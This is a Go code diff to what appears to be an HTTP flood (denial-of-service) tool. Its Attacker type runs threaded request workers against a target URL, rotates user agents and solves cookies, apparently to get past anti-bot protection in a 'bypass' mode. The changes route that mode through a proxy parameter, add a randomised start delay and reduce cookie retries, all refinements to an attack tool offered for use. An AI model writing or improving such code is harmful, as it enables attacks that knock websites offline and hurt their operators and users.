@@ -2,8 +2,11 @@ package main
 
 import (
 	"bytes"
+	crand "crypto/rand"
 	"crypto/tls"
 	"fmt"
+	"math"
+	"math/big"
 	"math/rand"
 	"net/http"
 	"strconv"
@@ -21,7 +24,7 @@ type Attacker struct {
 	userAgent string
 }
 
-func ParseAttack(attack Attack, config Config, tag string) {
+func ParseAttack(attack Attack, config Config, proxy string) {
 	var attacker Attacker
 	attacker.config = config
 	attacker.attack = attack
@@ -29,7 +32,7 @@ func ParseAttack(attack Attack, config Config, tag string) {
 	case "simple", "custom":
 		attacker.DefaultAttack()
 	case "bypass":
-		attacker.BypassAttack(tag)
+		attacker.BypassAttack(proxy)
 	}
 }
 
@@ -51,11 +54,11 @@ func (a *Attacker) SetUserAgent() {
 	}
 }
 
-func (a *Attacker) SolveCookie(tag string) error {
+func (a *Attacker) SolveCookie(proxy string) error {
 	var err error
 	var cookies []Cookie
-	for i := 0; i < 5; i++ {
-		cookies, err = GetCookies(a.config, a.attack.TargetURL, a.attack.CustomHeader, a.userAgent, tag)
+	for i := 0; i < 3; i++ {
+		cookies, err = GetCookies(a.config, a.attack.TargetURL, a.attack.CustomHeader, a.userAgent, proxy)
 		if err != nil {
 			fmt.Println(err)
 			time.Sleep(time.Second * 3)
@@ -180,9 +183,6 @@ func (a *Attacker) DefaultAttack() {
 	startTime := time.Now()
 	for time.Now().Sub(startTime) <= time.Second*time.Duration(a.attack.Duration) {
 		time.Sleep(time.Second)
-		a.SetUserAgent()
-		a.RandomizeData()
-		a.BuildRequest()
 	}
 	for i := 0; i < a.attack.Thread; i++ {
 		expired <- true
@@ -201,9 +201,12 @@ func Equal(a, b []Cookie) bool {
 	return true
 }
 
-func (a *Attacker) BypassAttack(tag string) {
+func (a *Attacker) BypassAttack(proxy string) {
+	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
+	rand.Seed(seed.Int64())
+	time.Sleep(time.Second * time.Duration(rand.Intn(25)+5))
 	a.SetUserAgent()
-	err := a.SolveCookie(tag)
+	err := a.SolveCookie(proxy)
 	if err != nil {
 		return
 	}
@@ -217,7 +220,7 @@ func (a *Attacker) BypassAttack(tag string) {
 	for i := 0; i < a.attack.Thread; i++ {
 		go a.Worker(expired)
 	}
-	go a.CheckResponse(expired, tag)
+	go a.CheckResponse(expired, proxy)
 
 	lastCookie := a.cookies
 	startTime := time.Now()
@@ -233,7 +236,7 @@ func (a *Attacker) BypassAttack(tag string) {
 	}
 }
 
-func (a *Attacker) CheckResponse(expired chan bool, tag string) {
+func (a *Attacker) CheckResponse(expired chan bool, proxy string) {
 	exit := false
 	go func() {
 		exit = <-expired
@@ -250,7 +253,7 @@ func (a *Attacker) CheckResponse(expired chan bool, tag string) {
 		}
 		r, _ := client.Do(a.request)
 		if r.StatusCode != 200 {
-			a.SolveCookie(tag)
+			a.SolveCookie(proxy)
 		}
 		r.Body.Close()
 		time.Sleep(time.Second)
